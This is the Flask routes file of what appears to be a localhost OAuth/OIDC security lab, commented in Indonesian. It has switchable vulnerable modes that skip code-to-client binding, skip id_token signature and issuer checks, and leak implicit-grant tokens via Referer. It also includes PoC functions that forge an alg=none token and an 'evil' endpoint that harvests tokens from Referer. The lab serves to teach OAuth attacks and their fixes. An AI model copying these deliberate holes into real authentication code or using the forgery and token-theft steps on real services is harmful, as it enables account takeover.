import re
import time

from flask import Blueprint, render_template, request, session, jsonify, redirect, url_for

from app import models as M
from app import jwt as J

bp = Blueprint('main', __name__)

CB = 'http://127.0.0.1:5090/app/cb'
EVIL_CB = 'http://127.0.0.1:5090/evil/client/cb'


def scenario(k):
    return M.setting(k)


def provider_user():
    return M.user_by_username(session.get('provider_user')) if session.get('provider_user') else None


# ----------------------------------------------------------------- provider

@bp.route('/oauth/authorize')
def oauth_authorize():
    client_id = request.args.get('client_id', '')
    ruri = request.args.get('redirect_uri', '')
    rtype = request.args.get('response_type', 'code')
    scope = request.args.get('scope', '')
    state = request.args.get('state', '')
    cl = M.client(client_id)
    if not cl:
        return 'client tidak dikenal', 400
    ok_uri = cl['redirect_uri'] == ruri
    steps = [f'validate redirect_uri: expected={cl["redirect_uri"]} vs given={ruri} → '
             f'{"MATCH (lolos)" if ok_uri else "TIDAK MATCH (ditolak)"}']
    if not ok_uri:
        M.log('idp', ' || '.join(steps) + ' → authorize ditolak')
        return render_template('idp_error.html', steps=steps + ['redirect_uri tidak cocok dengan client yang diklaim.'])
    if rtype == 'token' and not scenario('s4'):
        # FIXED s4: provider menolak implicit grant → token tidak pernah masuk URL
        M.log('idp', 'implicit response_type=token ditolak (mode fix)')
        return redirect(ruri.replace('/cb', '/cb?error=implicit_disallowed'))
    if not provider_user():
        return redirect(url_for('main.provider_page', next='authorize?' + request.query_string.decode()))
    return render_template('approve.html', client_name=cl['name'], client_id=client_id,
                           scope=scope, ruri=ruri, rtype=rtype, state=state, user=provider_user())


@bp.route('/oauth/approve', methods=['POST'])
def oauth_approve():
    u = provider_user()
    if not u:
        return redirect('/provider')
    ruri = request.form['redirect_uri']
    rtype = request.form.get('response_type', 'code')
    state = request.form.get('state', '')
    cl = M.client(request.form['client_id'])
    code = M.new_code(request.form['client_id'], ruri, u, request.form.get('scope', ''))
    M.log('idp', f'approve → code {code[:10]}… untuk {u["username"]} via client {cl["id"]}')
    if rtype == 'token':
        # implicit: akses token langsung dikirim lewat URL (fragment) — tanpa code
        tok = M.new_token(u, note='implicit')
        M.log('idp', f'implicit → access_token {tok[:12]}… ditaruh di URL (fragment)')
        return redirect(ruri + '#access_token=' + tok + '&token_type=bearer&state=' + state)
    return redirect(ruri + '?code=' + code + '&state=' + state)


@bp.route('/oauth/token', methods=['POST'])
def oauth_token():
    f = request.form
    code_s = f.get('code', '')
    client_id = f.get('client_id', '')
    ruri = f.get('redirect_uri', '')
    code = M.find_code(code_s)
    if not code or code['used'] or code['exp'] < time.time():
        return jsonify({'error': 'invalid_grant'}), 400
    ok = True
    note = ''
    if not scenario('s1'):
        bound = (code['client_id'] == client_id) and (code['redirect_uri'] == ruri)
        note = f'code ter-bind ke client {code["client_id"]}; presenter {client_id}'
        if not bound:
            ok = False
            note += ' → BINDING TIDAK COCOK (ditolak)'
    else:
        ok = True
        note = f'[VULN] bind client DIABAIKAN: code untuk {code["client_id"]} ditukar oleh {client_id}'
    if not ok:
        M.log('s1', note)
        return jsonify({'error': 'invalid_grant', 'detail': note}), 400
    M.mark_used(code)
    user = _user_by_id(code['user_id'])
    tok = M.new_token(user)
    if 'openid' in code['scope'].split():
        id_token = J.issuer_id_token(J.CORP_SECRET, J.CORP_ISSUER, user['username'],
                                     user['email'], bool(user['email_verified']), client_id)
    else:
        id_token = ''
    M.log('s1', note + f' → access_token {tok[:12]}… milik {user["username"]}')
    return jsonify({'access_token': tok, 'token_type': 'bearer',
                    'id_token': id_token, 'note': note})


def _user_by_id(uid):
    with M.conn() as c:
        r = c.execute('SELECT * FROM users WHERE id=?', (uid,)).fetchone()
        return dict(r) if r else None


@bp.route('/oauth/me')
def oauth_me():
    auth = request.headers.get('Authorization', '')
    tok = auth[7:] if auth.startswith('Bearer ') else request.args.get('access_token', '')
    u = M.user_for_token(tok)
    if not u:
        return jsonify({'error': 'invalid_token'}), 401
    return jsonify({'sub': u['username'], 'email': u['email'],
                    'email_verified': u['email_verified'], 'tenant': u['tenant']})


@bp.route('/oauth/jwks.json')
def oauth_jwks():
    return jsonify({'note': 'di lab ini id_token -> HS256 (secret simetris). '
                            'Di produksi: RSA/EC JWA -> endpoint ini berisi public keys.'})


@bp.route('/provider')
def provider_page():
    next_url = request.args.get('next', '')
    return render_template('provider.html', current=session.get('provider_user'),
                           next_url=next_url)


@bp.route('/oauth/login', methods=['POST'])
def oauth_login():
    identity = request.form['identity']
    u = M.user_by_username(identity)
    if not u:
        return 'unknown identity', 400
    session['provider_user'] = u['username']
    next_url = request.form.get('next', '')
    M.log('idp', f'provider login: {identity}')
    return redirect('/oauth/' + next_url if next_url else '/provider')


# ----------------------------------------------------------------- client app (korban)

def _client_login(id_token):
    """Client app memproses id_token dari provider (login)."""
    h, p = J.decode(id_token)
    if not p.get('email'):
        return None, 'id_token tidak punya email'
    checks = []
    if not scenario('s2'):
        if h.get('alg') != 'HS256':
            return None, f', '.join(checks) + f'alg "{h.get("alg")}" tidak diizinkan → ditolak (verifikasi signature ON)'
        if not J.verify(id_token, J.CORP_SECRET):
            return None, 'signature id_token tidak valid → ditolak'
        checks.append('signature HS256 OK')
    if not scenario('s3'):
        if p.get('iss') != J.CORP_ISSUER:
            return None, f'iss "{p.get("iss")}" ≠ {J.CORP_ISSUER} → ditolak (allowlist issuer ON)'
        checks.append('iss terdaftar (corp tenant)')
    if scenario('s2') and scenario('s3'):
        checks.append('(VULN) signature & issuer TIDAK diverifikasi')
    u = M.user_by_email(p['email'])
    if not u:
        return None, f'email {p["email"]} tidak terdaftar di client'
    return u, ' | '.join(checks)


@bp.route('/app')
def app_index():
    return redirect('/app/login')


@bp.route('/app/login')
def app_login():
    cl = M.client('web-app')
    return render_template('app_login.html', client=cl, cb=CB)


@bp.route('/app/cb')
def app_cb():
    code = request.args.get('code', '')
    state = request.args.get('state', '')
    if request.args.get('error'):
        return render_template('cb_result.html', ok=False,
                               msg='provider menolak: ' + request.args.get('error'))
    ok = True
    details = []
    if not code:
        ok, msg = False, 'tidak ada code'
    else:
        # client menukar code di token endpoint
        from urllib import request as ur
        data = f'grant_type=authorization_code&code={code}&client_id=web-app&client_secret=web-secret&redirect_uri={CB}'.encode()
        req = ur.Request('http://127.0.0.1:5090/oauth/token', data=data)
        try:
            import json as _j
            resp = _j.loads(ur.urlopen(req, timeout=4000).read())
            id_token = resp.get('id_token') or ''
            user, note = _client_login(id_token)
            if user:
                session['client_user'] = user['username']
                details.append(f'access_token: {resp.get("access_token","")[:14]}…')
                details.append(note)
                details.append(f'LOGIN OK sebagai {user["username"]} ({user["email"]})')
                if user['flag']:
                    details.append('FLAG: ' + user['flag'])
                return render_template('cb_result.html', ok=True, msg='Login sukses.',
                                       details=details, flag=user['flag'])
            ok = False
            msg = 'Login ditolak: ' + str(note)
        except Exception as e:
            ok, msg = False, 'token exchange error: ' + str(e)
    M.log('client', msg)
    return render_template('cb_result.html', ok=ok, msg=(msg if not ok else ''), details=details)


@bp.route('/app/implicit')
def app_implicit():
    cl = M.client('web-app')
    cl_id = cl['id']
    return render_template('app_implicit.html', cl_id=cl_id, ruri=CB.replace('/cb', '/implicit/cb'),
                           scope='profile email')


@bp.route('/app/implicit/cb')
def app_implicit_cb():
    # JS path page — token fragment diproses client-side (lihat template)
    return render_template('app_implicit_cb.html', ruri=CB.replace('/cb', '/implicit/cb'))


@bp.route('/app/profile')
def app_profile():
    tok = request.args.get('token', '')
    u = M.user_for_token(tok)
    if not u:
        return jsonify({'error': 'invalid token'})
    M.log('app', f'profile query-string dipanggil dgn token {tok[:14]}… (bocor ke Referer!)')
    return render_template('profile.html', user=u)


# ----------------------------------------------------------------- evil (attacker infra)

def _stolen_from_referer(ref):
    m = re.search(r'[?&](?:access_token|token)=([^&\s]+)', ref or '')
    tok = m.group(1) if m else ''
    u = M.user_for_token(tok) if tok else None
    return tok or '', u, (u['flag'] if u else None)


@bp.route('/evil/ref')
def evil_ref():
    ref = request.headers.get('Referer', '')
    tok, u, flag = _stolen_from_referer(ref)
    M.log('evil', 'Referer ditangkap: ' + (ref[:200] or '(tidak ada)'))
    return render_template('evil_ref.html', ref=ref, token=tok or '(tidak ada token)',
                           flag=flag, stolen=bool(u))


@bp.route('/evil/client')
def evil_client():
    return render_template('evil_client.html', cb=EVIL_CB)


@bp.route('/evil/client/cb')
def evil_client_cb():
    code = request.args.get('code', '')
    stolen = request.args.get('stolen', '0') == '1'
    data = f'grant_type=authorization_code&code={code}&client_id=evil-app&client_secret=evil-secret&redirect_uri={EVIL_CB}'.encode()
    from urllib import request as ur
    import json as _j
    resp = _j.loads(ur.urlopen(ur.Request('http://127.0.0.1:5090/oauth/token', data=data), timeout=4000).read())
    tok = resp.get('access_token', '')
    u = M.user_for_token(tok) if tok else None
    flag = u['flag'] if u and u['username'] == 'victim' else None
    return render_template('evil_client_cb.html', resp=resp, tok=tok[:14] + '…' if tok else '',
                           account=u, flag=flag)


# ----------------------------------------------------------------- dashboard & api

@bp.route('/')
def index():
    return render_template('index.html', modes=M.all_settings())


@bp.route('/logs')
def logs_view():
    return render_template('logs.html', logs=M.last_logs())


@bp.route('/api/toggle/<key>', methods=['POST'])
def api_toggle(key):
    if key not in ('s1', 's2', 's3', 's4'):
        return jsonify({'error': 'unknown'}), 400
    body = request.get_json(silent=True) or {}
    vuln = bool(body.get('vulnerable', True))
    M.set_setting(key, vuln)
    M.log('app', f'toggle {key} → {"RENTAN" if vuln else "FIXED"}')
    return jsonify({'key': key, 'vulnerable': vuln})


@bp.route('/api/state')
def api_state():
    return jsonify({'modes': M.all_settings(),
                    'provider': session.get('provider_user'),
                    'client_user': session.get('client_user')})


def _finish(ok, steps, flag=None):
    return jsonify({'ok': bool(ok), 'mode': 'FIXED' if not ok else 'RENTAN',
                    'steps': steps, 'flag': flag})


# ----------------------------------------------------------------- PoCs

def poc_s1():
    steps = ['Alice (victim) login ke "Web App" (client web-app) → provider terbitkan authorization code',
             'Attacker mencuri code itu dari Web App (XSS/redirect/history — di luar scope lab ini).']
    # victim authorize
    cl = M.client('web-app')
    v = M.user_by_username('victim')
    code = M.new_code('web-app', cl['redirect_uri'], v, 'profile email')
    steps.append(f'Code victim: {code[:10]}… (ter-bind ke web-app/client redirect {cl["redirect_uri"][:44]}…)')
    # attacker redeem with evil-app
    steps.append('Attacker, dgn evil-app, mengirim code itu ke token endpoint tapi mengaku client_id=evil-app:')
    ok, note, user, tok = _redeem_swap(code)
    steps.append('  POST /oauth/token code=… client_id=evil-app secret=evil-secret' + ('  → ' + note))
    if ok:
        steps.append(f'RESULT: token terbit utk akun victim ({user["username"]}) & dipakai attacker — access_token {tok[:12]}…')
        steps.append(f'GET /oauth/me → {user["email"]} (diskonita)')
        if user and user['flag']:
            steps.append('FLAG: ' + user['flag'])
            return _finish(True, steps, user['flag'])
        return _finish(True, steps)
    steps.append('BLOCKED: token endpoint menolak — code ter-bind ke web-app, bukan evil-app.')
    return _finish(False, steps)


def _redeem_swap(code):
    with M.conn() as c:
        r = c.execute('SELECT * FROM authcodes WHERE code=?', (code,)).fetchone()
        if scenario('s1'):
            c.execute('UPDATE authcodes SET used=1 WHERE code=?', (code,))
        bound = r['client_id'] == 'evil-app' and r['redirect_uri'] == EVIL_CB
    u = _user_by_id(r['user_id'])
    if scenario('s1'):
        tok = M.new_token(u)
        return True, f'[VULN] bind client & redirect DIABAIKAN → token utk {u["username"]}', u, tok
    return False, 'token endpoint: code bukan utk client pemohon → ditolak (binding verified)', None, ''


def poc_s2():
    steps = ['Attacker membuat id_token palsu utk email korban (alg=none, tanpa tanda tangan).']
    from app.jwt import forged_alg_none
    forged = forged_alg_none({'iss': J.CORP_ISSUER, 'sub': 'victim', 'aud': 'web-app',
                              'email': 'victim@corp.test', 'email_verified': 1})
    steps.append('id_token: ' + forged[:60] + '… (header {"alg":"none"})')
    h, p = J.decode(forged)
    steps.append(f'Decode: alg={h.get("alg")}, email={p.get("email")} (verified={p.get("email_verified")})')
    user, note = _client_login(forged)
    if user:
        steps.append(f'RESULT: client menerimanya & login sebagai {user["username"]} ({user["email"]}) — {note}')
        steps.append('FLAG: ' + user['flag'])
        return _finish(True, steps, user['flag'])
    steps.append('BLOCKED: ' + note)
    return _finish(False, steps)


def poc_s3():
    steps = ['Attacker daftar tenant attackercloud.io & membuat akun dgn email victim@corp.test (di tenant-nya, verified=true).',
             'IdP attackercloud menerbitkan id_token SAH utk akun itu (ditandatangani kunci tenant attacker).']
    mtoken = J.issuer_id_token(J.ATK_SECRET, 'https://id.attackercloud.io', 'atk-dup',
                               'victim@corp.test', True, 'web-app')
    steps.append('id_token tenant lain: iss=https://id.attackercloud.io, email=victim@corp.test')
    user, note = _client_login(mtoken)
    if user and user['username'] == 'victim':
        steps.append(f'RESULT: app mempercayai email begitu saja (iss/tenant tidak diperiksa) → masuk akun {user["username"]} — {note}')
        steps.append('FLAG: ' + user['flag'])
        return _finish(True, steps, user['flag'])
    steps.append('BLOCKED: ' + note)
    return _finish(False, steps)


def poc_s4():
    steps = ['Victim login lewat implicit grant → access token ditaruh di URL (fragment/query).',
             'Halaman output client merepost token ke /app/profile?token=… (query string).',
             'Di halaman itu ada <img src="/evil/ref"> → browser kirim Referer berisi URL dengan token.']
    if not scenario('s4'):
        steps.append('Client beralih ke authorization code: access token dikirim via POST body — TIDAK pernah muncul di URL.')
        steps.append('Referrer-Policy: no-referrer → browser mengirim Referer tanpa token.')
        steps.append('BLOCKED: /evil/ref tidak mendapat akses token (Referer kosong/tanpa token).')
        return _finish(False, steps)
    v = M.user_by_username('victim')
    tok = M.new_token(v, note='implicit-token')
    ref = f'http://127.0.0.1:5090/app/profile?token={tok}'
    steps.append(f'access_token victim: {tok}')
    c_tok, c_u, c_flag = _stolen_from_referer(ref)
    M.log('evil', 'Referer ditangkap: ' + ref[:200])
    steps.append('Referer tertangkap /evil/ref (simulasi browser): ' + ref[:120] + '…')
    if c_tok and c_u:
        steps.append('Attacker ekstrak token dari Referer → bisa pakai ke /oauth/me → data victim.')
        steps.append(f'Data victim: {c_u["email"]}')
        steps.append('FLAG: ' + c_flag)
        return _finish(True, steps, c_flag)
    steps.append('BLOCKED: token tidak sampai ke server penyerang (tidak ada token di Referer / query).')
    return _finish(False, steps)


POCS = {'s1': poc_s1, 's2': poc_s2, 's3': poc_s3, 's4': poc_s4}


@bp.route('/api/poc/<sc>', methods=['POST'])
def api_poc(sc):
    fn = POCS.get(sc)
    if not fn:
        return jsonify({'error': 'unknown poc'}), 400
    try:
        return fn()
    except Exception as e:
        M.log(sc, 'poc exception: ' + str(e))
        return jsonify({'ok': False, 'steps': ['error: ' + str(e)]})